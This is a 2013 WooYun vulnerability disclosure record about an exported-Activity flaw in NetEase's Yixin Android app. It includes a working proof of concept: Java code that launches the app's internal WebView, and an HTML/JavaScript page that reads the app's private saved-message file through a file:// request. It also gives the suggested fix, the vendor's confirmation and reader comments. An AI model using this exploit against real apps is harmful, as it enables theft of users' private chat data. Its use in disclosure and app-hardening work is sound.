{"id": 7820, "wybug_id": "wooyun-2013-036017", "wybug_title": "易信组件存在信息泄露漏洞可导致恶意APP获取其私有目录数据（非root环境）", "wybug_corp": "网易", "wybug_author": "小p优优", "wybug_date": "2013-09-03 16:21", "wybug_open_date": "2013-12-02 16:21", "wybug_type": "用户敏感数据泄漏", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-09-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-09-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-09-09：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-10-31：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-11-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-11-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-12-02：\t细节向公众公开  简要描述： 易信的组件使用不当存在信息泄露漏洞、弹窗，恶意攻击者可能可以使用这个漏洞窃取用户隐私，或者弹一些恶意构造的广告 详细说明：  启动界面WelcomeActivity是导出的， WelcomeActivity的.method private h()V存在如下smali:\nLim/yixin/activity/WelcomeActivity;->getIntent()Landroid/content/Intent;......Landroid/content/Intent;->getParcelableExtra(Ljava/lang/String;)Landroid/os/Parcelable;......Lim/yixin/activity/WelcomeActivity;->startActivity(Landroid/content/Intent;)V\n当一个攻击app(恶意或非恶意均可以) 可以通过这个导出的组件，打开一个本地页面时，此本地页面中的可以按照攻击app的要求获取易信下的所有数据，包括聊天数据库等，盗取过程无需root，盗取之后可以发送给远程服务器！ 利用细节:这里是手动把file:///mnt/sdcard/yixin.html放在sd卡上，在攻击app中直接释放这个html主要实现代码:\nstatic final String YIXIN_PKG = \"im.yixin\"; static final String CustomWebView_ACTIVITY = \"im.yixin.activity.CustomWebView\"; static final String Welcome_ACTIVITY = \"im.yixin.activity.WelcomeActivity\";    public void attack()  {        Intent contIntent = new Intent();        contIntent.putExtra(\"url\", \"file:///mnt/sdcard/yixin.html\");        Intent intent = new Intent();        intent.setClassName(YIXIN_PKG, Welcome_ACTIVITY);        Class lunch = null;        File aOptimizedDexOutputPath = getDir(\"outdex\", Context.MODE_PRIVATE);        File dexFile = new File(\"/data/app/im.yixin-1.apk\");          if(dexFile.exists()){\t\t\t\tDexClassLoader loader = new DexClassLoader(dexFile.toString() , aOptimizedDexOutputPath.getAbsolutePath() , \t\t\t\t\tnull , ClassLoader.getSystemClassLoader());\t        try {\t\t\t\tlunch = Class.forName(\"im.yixin.activity.CustomWebView\",true,loader);\t\t\t} catch (ClassNotFoundException e) {\t\t\t\te.printStackTrace();\t\t\t}        }        intent.putExtra(\"target\", lunch);        intent.putExtra(\"data\", contIntent);        this.startActivity(intent);    }\n存放在/mnt/sdcard/yixin.html内容如下:\n<html><body><script type=\"text/javascript\">function getMessage() {\tvar request = false;    if(window.XMLHttpRequest) {        request = new XMLHttpRequest();\t\tif(request.overrideMimeType) {\t\t\trequest.overrideMimeType('text/xml');\t\t}    }\t    xmlhttp = request;    //获取本地文件代码    xmlhttp.open(\"GET\", \"file:////data/data/im.yixin/shared_prefs/saveTextMessage.xml\", false);    xmlhttp.send(null);    var ret = xmlhttp.responseText;\treturn ret;}alert(getMessage());</script></body></html>\n   漏洞证明：  导出activity，导致可以打开一个本地页面时，此本地页面中的可以按照攻击app的要求获取易信下的所有数据，包括聊天数据库等，盗取过程无需root，盗取之后可以发送给远程服务器！   修复方案：  导出activity控制getIntent以及getParcelableExtra的使用   版权声明：转载请注明来源 小p优优@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2013-09-06 16:49 厂商回复： 感谢您对网易的关注，漏洞已经修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-09-03 16:26 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  Nice!    \n     2013-09-03 16:57 |    \t\tlucky \t\t\t( 普通白帽子  |\t\t\t        Rank:409 漏洞数:84        | 三人行必有我师焉########################...)\t\t \n  强势围观！    \n     2013-09-03 17:00 |    \t\tppt \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | ) | ( 我猜出了用户名，可我没猜出密码。)\t\t \n  要火    \n     2013-09-03 17:02 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  android下！？    \n     2013-09-03 19:08 |    \t\tSct7p \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:9        | 懂与不懂之间只隔了一层纸，懂的人会觉得很...)\t\t \n  霸气    \n     2013-09-03 21:51 |    \t\t艾特绅 \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:5        | 愿意为网络安全做出我的贡献)\t\t \n  马克    \n     2013-11-26 08:56 |    \t\t啊L川 \t\t\t( 普通白帽子  |\t\t\t        Rank:195 漏洞数:39        | 菜鸟 ，菜渣， 菜呀！)\t\t \n  马克    \n     2013-12-03 10:08 |    \t\t小保哥 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 神奇的小保哥)\t\t \n  大神你好，我在自己的WEBView里面测试的时候，使用xhr获取本地路径的xml文件好像是没有权限的呢？求指点~另外，这里是不是应该是3个斜杠 file:////data    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}